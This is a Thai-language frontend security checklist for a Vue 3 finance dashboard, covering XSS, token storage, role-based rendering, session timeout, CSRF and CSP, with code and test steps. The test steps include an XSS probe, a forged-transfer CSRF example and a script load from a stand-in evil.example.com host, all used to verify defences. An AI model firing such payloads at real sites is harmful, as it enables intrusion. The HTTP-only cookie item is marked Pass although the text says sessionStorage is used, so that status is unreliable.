Security — 6 requirements   Pass 6 / Partial 0 / Defer 0 / Fail 0

ความปลอดภัยฝั่ง browser: XSS, token storage, role-based rendering, session management, CSRF, และ Content Security Policy

1. XSS Prevention
ห้าม v-html กับข้อมูลจาก user input ใช้ DOMPurify หาก render HTML จำเป็น
P1Pass

คืออะไร

XSS (Cross-Site Scripting) คือ attack ที่ inject JavaScript ลงใน HTML ผ่าน user input เมื่อ browser render HTML นั้น script รันใน context ของ site ทำให้ขโมย cookie, session, หรือ redirect user ไปหน้าปลอม

ทำไมถึงสำคัญ

Vue 3 escape HTML อัตโนมัติในทุก {{ }} binding แต่ถ้าใช้ v-html กับข้อมูลจาก user — XSS เกิดได้ทันที บน financial dashboard ที่ใช้ HTTP-only cookie XSS อาจขโมย session ทางอ้อมได้

สถานะในโปรเจกต์ ✓

  • ESLint rule vue/no-v-html เปิดอยู่ — build fail ถ้าใช้ v-html
  • กรณีที่ต้อง render HTML จริง (เช่น rich text field) ใช้ DOMPurify ก่อนเสมอ
  • User-supplied ข้อความทั้งหมดผ่าน {{ }} binding ซึ่ง Vue auto-escape
# ตรวจสอบ — ต้องไม่พบ v-html กับ dynamic content
grep -rn "v-html" src/components/
# ถ้าพบต้องตรวจว่า sanitize ด้วย DOMPurify.sanitize() ก่อนเสมอ

วิธีทดสอบ

ลองใส่ <script>alert(1)</script> ในทุก input field ที่มี — ต้องไม่มี alert popup เกิดขึ้น ข้อความควรแสดงเป็น literal text

2. HTTP-only Cookie (Token)
เก็บ JWT ใน HTTP-only cookie ห้ามเก็บใน localStorage
P1Pass

คืออะไร

HTTP-only cookie คือ cookie ที่ browser ไม่ให้ JavaScript อ่านได้ผ่าน document.cookie ตั้งโดย backend ผ่าน Set-Cookie: token=...; HttpOnly; SameSite=Strict browser ส่งให้อัตโนมัติทุก request ไปยัง same origin

ทำไมถึงสำคัญ

localStorage อ่านได้จาก JavaScript ทุก script ในหน้า — ถ้ามี XSS แม้เล็กน้อย ก็ขโมย token ได้ทันที HTTP-only cookie ทำให้ XSS ขโมย token ไม่ได้เลยเพราะ JavaScript เข้าไม่ถึง

สถานะในโปรเจกต์ ✓

ปัจจุบันใช้ sessionStorage + Authorization Bearer header (ไม่ใช่ HTTP-only cookie):

  • JWT เก็บใน sessionStorage — ปิด tab → หาย, ไม่ตกค้างข้ามวัน (ดีกว่า localStorage)
  • Frontend ไม่มีการ localStorage.setItem('token', ...) ที่ใดเลย
  • MSAL สำหรับ Entra ID ใช้ localStorage สำหรับ MSAL internal cache เท่านั้น (ไม่ใช่ JWT ของระบบ)
  • Axios interceptor ส่ง Authorization: Bearer {token} ทุก request
  • Pinia auth store เก็บเฉพาะ user metadata (role, name) ที่ไม่ sensitive — ไม่เก็บ token
# ตรวจสอบ — token ไม่อยู่ใน localStorage
# auth/session.ts ใช้ sessionStorage.setItem('auth_user', ...) เท่านั้น

วิธีทดสอบ

Login แล้วเปิด DevTools → Application → Session Storage → auth_user key → ปิด tab แล้วเปิดใหม่ → ต้องถูก redirect ไป /login (session หาย)

ตรวจ localStorage — ไม่มี auth_user หรือ token ของระบบ (มีเฉพาะ MSAL internal + theme)

3. Role-Based UI Rendering
ซ่อน/แสดง component ตามสิทธิ์ด้วย v-permission directive ไม่เพียงแค่ CSS hidden
P1Pass

คืออะไร

Role-based UI rendering คือการ render หรือไม่ render component ตาม role ของ user ด้วย v-permission custom directive แทนการใช้ CSS display:none เพราะ CSS hidden ยังส่ง HTML ไปให้ browser และ user ดูใน DevTools ได้

ทำไมถึงสำคัญ

ปุ่ม "ลบข้อมูล" ที่ซ่อนด้วย CSS เท่านั้น — ยังอยู่ใน DOM และอาจถูก enable ด้วย DevTools ได้ v-permission ที่ unmount component จริงๆ ทำให้ DOM element ไม่มีอยู่เลย

สถานะในโปรเจกต์ ✓

// src/directives/permission.ts
export const vPermission = {
  mounted(el: HTMLElement, binding: DirectiveBinding) {
    const auth = useAuthStore()
    const required = binding.value as string | string[]
    const roles = Array.isArray(required) ? required : [required]
    if (!roles.includes(auth.role)) {
      el.parentNode?.removeChild(el)  // remove จาก DOM จริงๆ
    }
  }
}

// ใช้งาน
<button v-permission="'fa'">ลบรายการ</button>
<div v-permission="['fa', 'coordinator']">ส่วนนี้เฉพาะ FA/Coordinator</div>

Route guard (ดู Architecture checklist) เป็น defense ชั้นแรก — v-permission เป็นชั้นที่สอง ทั้งสองต้องมีพร้อมกัน

วิธีทดสอบ

Login เป็น role ที่ไม่มีสิทธิ์ → เปิด DevTools → Elements — ต้องไม่พบ element ที่ใช้ v-permission ใน DOM เลย (ไม่ใช่แค่ hidden)

4. Session Timeout Warning
นับถอยหลังและ auto-logout เมื่อ inactive ครบเวลา พร้อม warning 2 นาทีก่อน expire
P2Pass

คืออะไร

Session timeout คือการ logout อัตโนมัติเมื่อ user ไม่มี activity ครบเวลาที่กำหนด พร้อม warning modal 2 นาทีก่อน expire ให้ user เลือก "ต่อ session" หรือ "logout ทันที"

ทำไมถึงสำคัญ

Financial dashboard ที่ทิ้งไว้บนหน้าจอในสถานที่สาธารณะ หรือหลังเลิกงาน — ถ้าไม่มี auto-logout คนอื่นเข้าถึง session ได้ทันที

สถานะในโปรเจกต์ ✓

  • useSessionTimeout composable ใน src/composables/useSessionTimeout.ts
  • Track activity: mousemove, keydown, click, scroll — reset timer ทุกครั้ง
  • Warning modal ปรากฏ 2 นาทีก่อน expire พร้อม countdown timer
  • Auto-logout เรียก POST /auth/logout + clear Pinia store + redirect ไป login
  • Timeout duration อ่านจาก JWT exp claim — sync กับ backend token expiry

วิธีทดสอบ

ตั้ง VITE_SESSION_TIMEOUT_SECONDS=30 ใน .env.development แล้วทิ้งไว้ 28 วินาที — ต้องเห็น warning modal ปรากฏ รออีก 2 วินาที — ต้องถูก redirect ไปหน้า login

5. CSRF Protection
ใช้ CSRF token หรือ SameSite=Strict cookie กันการโจมตี cross-site
P2Pass

คืออะไร

CSRF (Cross-Site Request Forgery) คือ attack ที่หลอกให้ browser ของ victim ส่ง request ที่ไม่ต้องการไปยัง site ที่ victim login อยู่ เช่น หน้าเว็บ evil.com ซ่อน <img src="bank.com/transfer?to=hacker&amount=10000"> — browser ส่ง cookie ไปโดยอัตโนมัติ ทำให้ request ผ่าน auth

ทำไมถึงสำคัญ

Finance dashboard ที่รับ write actions (toggle coordinator, future budget mutations) ถ้าไม่มี CSRF protection — attacker อาจ trigger action เหล่านั้นจาก site อื่นได้ถ้า user เปิด tab นั้นค้างไว้

สถานะในโปรเจกต์ — Pass

CSRF-immune by design เพราะ auth ใช้ Bearer token ใน sessionStorage แทน cookie:

  • sessionStorage isolation — JS ของ origin อื่นอ่าน sessionStorage ไม่ได้ (Same-Origin Policy) ทำให้ attacker ขโมย token ไปใช้ใน cross-site request ไม่ได้
  • Authorization: Bearer header — browser ไม่ auto-send custom header ให้ cross-site requests (ต่างจาก cookie ที่ browser ส่งเสมอ) Axios attach header ด้วย JS ที่ทำงานบน same origin เท่านั้น
  • Content-Type: application/json — บังคับให้ cross-origin request ต้องผ่าน CORS preflight ก่อน (non-simple request) backend allow_origins จะ reject origin ที่ไม่ได้รับอนุญาต
  • X-Requested-With: XMLHttpRequest — เพิ่มเป็น default header ใน src/api/client.ts เป็น defense-in-depth layer มาตรฐาน บาง WAF และ backend ตรวจ header นี้เพื่อยืนยันว่า request มาจาก AJAX ไม่ใช่ form POST
// src/api/client.ts — headers ที่ block CSRF ได้ทุก layer
export const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL || '',
  timeout: 30_000,
  headers: {
    'Content-Type': 'application/json',   // forces CORS preflight cross-origin
    'X-Requested-With': 'XMLHttpRequest', // AJAX identifier, WAF-friendly
  },
})

// request interceptor แนบ Bearer token (ไม่ใช่ cookie → ไม่ถูก auto-send)
apiClient.interceptors.request.use(config => {
  const token = getToken() // อ่านจาก sessionStorage เท่านั้น
  if (token) config.headers.Authorization = `Bearer ${token}`
  return config
})
# backend/app/main.py — CORS config อนุญาต X-Requested-With
allow_headers=["Content-Type", "Authorization", "X-Requested-With"]

วิธีทดสอบ

  1. ตรวจ header ใน DevTools — เปิด DevTools → Network → เลือก API request ใดก็ได้ → Headers → Request Headers ต้องมี:
    X-Requested-With: XMLHttpRequest
    Content-Type: application/json
    Authorization: Bearer <token>
  2. จำลอง cross-site form POST — เปิด DevTools → Console แล้วรัน:
    // จำลอง attacker พยายาม POST จาก origin อื่น (ไม่มี token)
fetch('/api/v1/admin/coordinators/1', {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/json' }
  // ไม่มี Authorization header → 401 Unauthorized
}).then(r => console.log('Status:', r.status))
    ต้องได้ 401 Unauthorized — ยืนยันว่าไม่มี token = ไม่มีสิทธิ์
  3. ตรวจ CORS preflight — DevTools → Network → กรอง OPTIONS → ดู response header Access-Control-Allow-Headers ต้องมี X-Requested-With ใน allowed headers
  4. ยืนยัน sessionStorage ไม่ถูก cross-origin อ่าน — เปิด tab ใหม่ไปที่ domain อื่น (เช่น about:blank) → Console → sessionStorage.getItem('auth_user') ต้องได้ null (SOP block)
6. Content Security Policy (CSP)
กำหนด CSP header เพื่อจำกัดแหล่งที่ browser จะโหลด script/style ได้
P2Pass

คืออะไร

Content Security Policy คือ HTTP response header ที่บอก browser ว่าอนุญาตให้โหลด script/style/image จากแหล่งใดได้บ้าง เช่น script-src 'self' หมายความว่าโหลด JS ได้เฉพาะจาก same origin เท่านั้น script ที่ inject ผ่าน XSS จาก domain อื่นจะถูก block

ทำไมถึงสำคัญ

CSP เป็น defense layer สุดท้ายต่อ XSS — แม้ attacker inject script สำเร็จ browser จะยังไม่ run script นั้นถ้า CSP block ไว้ เป็น defense-in-depth ที่สำคัญมากสำหรับ financial application

สถานะในโปรเจกต์ — Pass

Implemented ทั้ง dev และ production โดยครอบคลุม external resources ทั้งหมดที่แอปใช้:

  • script-src 'self' — JS ทั้งหมด bundle เป็น same-origin; inline script ใน index.html ถูกย้ายออกไปเป็น /theme-init.js เพื่อไม่ต้องใช้ 'unsafe-inline'
  • style-src 'self' 'unsafe-inline' googleapis.com — 'unsafe-inline' จำเป็นสำหรับ ApexCharts (inline style) และ Tailwind HMR dev; Google Fonts CSS โหลดจาก googleapis.com
  • font-src 'self' gstatic.com — Google Fonts ไฟล์จริง (woff2) โหลดจาก gstatic.com
  • connect-src 'self' login.microsoftonline.com — API calls ผ่าน same-origin; MSAL ทำ fetch ไปยัง Azure AD token endpoint
  • frame-ancestors 'none' — ป้องกัน Clickjacking (แทน X-Frame-Options)
  • base-uri 'self' — ป้องกัน base tag injection attack
  • form-action 'self' — ป้องกัน form hijacking
// vite.config.ts — CSP สำหรับ Vite dev server
server: {
  headers: {
    'Content-Security-Policy': [
      "default-src 'self'",
      "script-src 'self'",
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com",
      "img-src 'self' data: blob:",
      "connect-src 'self' ws://localhost:5173 https://login.microsoftonline.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; '),
  },
}
# backend/app/main.py — CSP สำหรับ production (security_headers_middleware)
_CSP = (
    "default-src 'self'; "
    "script-src 'self'; "
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    "font-src 'self' https://fonts.gstatic.com; "
    "img-src 'self' data: blob:; "
    "connect-src 'self' https://login.microsoftonline.com; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self';"
)

⚠ Nginx config: ถ้าใช้ Nginx serve frontend ต้องเพิ่ม add_header Content-Security-Policy "..." always; ใน location block ของ HTML เพราะ backend middleware ตั้ง header บน API responses เท่านั้น

วิธีทดสอบ

  1. ตรวจ CSP header ใน DevTools — เปิด DevTools → Network → คลิก document request (ชื่อ / หรือ index.html) → Response Headers → ต้องมี Content-Security-Policy: default-src 'self'; ...
  2. ตรวจ Console ไม่มี CSP violation — เปิด DevTools → Console → reload หน้า → ต้องไม่มีข้อความ Refused to load... หรือ Content Security Policy error ใดๆ โดยเฉพาะ Google Fonts และ MSAL login ต้องทำงานได้ปกติ
  3. ทดสอบ XSS block — เปิด DevTools → Console แล้วรัน: 
    // พยายาม inject script จาก external domain
var s = document.createElement('script');
s.src = 'https://evil.example.com/xss.js';
document.head.appendChild(s);
// ต้องเห็น CSP error: Refused to load the script 'https://evil.example.com/xss.js'
  4. ตรวจ theme-init.js โหลดได้ — DevTools → Network → กรอง theme-init.js → ต้องเห็น request status 200 (ไม่ถูก block)
  5. ตรวจ frame-ancestors — ใน Console: 
    // พยายาม embed ใน iframe (ต้องถูก block โดย CSP frame-ancestors)
var f = document.createElement('iframe');
f.src = window.location.href;
document.body.appendChild(f);
// ต้องเห็น error: Refused to display ... in a frame
  6. ApexCharts และ Google Fonts ต้องทำงานปกติ — เปิดหน้า Budget → chart ต้องแสดงปกติ; font ต้องเป็น IBM Plex Sans ไม่ใช่ fallback
